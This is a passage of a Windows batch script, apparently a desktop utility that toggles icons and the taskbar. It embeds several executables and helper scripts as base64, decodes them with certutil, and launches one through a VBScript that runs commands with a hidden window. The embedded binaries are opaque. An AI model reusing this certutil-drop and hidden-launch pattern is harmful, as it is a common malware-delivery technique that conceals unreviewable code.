        "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"
    ) do (
        echo %%~a >> "!filePath!.tmp"
    )
    certutil -f -decode "!filePath!.tmp" "!filePath!" >nul
    del /f "!filePath!.tmp" >nul
    %return%
)

:dropStealthBootstrap ()
%private%
(
    set "filePath=!Paths.STEALTH_BOOTSTRAP!"
    
    for %%a in (
        "ZGltIHBhdGgsIGF0dHIKcGF0aCA9ICIiIiIgJiBXU2NyaXB0LkFyZ3VtZW50cygwKSAmICIiIiIKYXR0ciA9ICIiICYgV1NjcmlwdC5Bcmd1bWVudHMoMSkgJiAiIgpDcmVhdGVPYmplY3QoIldzY3JpcHQuU2hlbGwiKS5SdW4gcGF0aCAmIGF0dHIsIDAsIEZhbHNl"
    ) do (
        echo %%~a >> "!filePath!.tmp"
    )
    certutil -f -decode "!filePath!.tmp" "!filePath!" >nul
    del /f "!filePath!.tmp" >nul
    %return%
)

:dropDelegate ()
%private%
(
    set "filePath=!Paths.DELEGATE!"

    if exist "!filePath!" (
        %return%
    )
    for %%a in (
        "QGVjaG8gb2ZmCnNldGxvY2FsIEVuYWJsZURlbGF5ZWRFeHBhbnNpb24KCnNldCAicnVuRmlsZT0lfmRwMFxfX3J1bi50eHQiCgpjYWxsIDpfX21haW4gJSoKZ290byA6ZW9mCgo6X19tYWluIChuaXJjbWRjUGF0aCkKKAogICAgc2V0ICJ0aGlzLm5pcmNtZGNQYXRoPSUxIgoKICAgIGJyZWFrID4lcnVuRmlsZSUKCiAgICA6dGljawogICAgaWYgbm90IGV4aXN0ICVydW5GaWxlJSAoCiAgICAgICAgY2FsbCA6ZXhpdAogICAgKQogICAgIXRoaXMubmlyY21kY1BhdGghIHdpbiBoaWRlIGNsYXNzIFNoZWxsX1RyYXlXbmQKICAgIHRpbWVvdXQgL3QgNSA+bnVsCiAgICBnb3RvIDp0aWNrCikKCjpleGl0ICgpCigKICAgIHRpbWVvdXQgL3QgMiA+bnVsCiAgICAhdGhpcy5uaXJjbWRjUGF0aCEgd2luIHNob3cgY2xhc3MgU2hlbGxfVHJheVduZAogICAgZXhpdAopCg=="
    ) do (
        echo %%~a >> "!filePath!.tmp"
    )
    certutil -f -decode "!filePath!.tmp" "!filePath!" >nul
    del /f "!filePath!.tmp" >nul
    %return%
)

:dropNircmdc ()
%private%
(
    set "filePath=!Paths.NIRCMDC!"

    if exist "!filePath!" (
        %return%
    )
    for %%a in (
        "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"
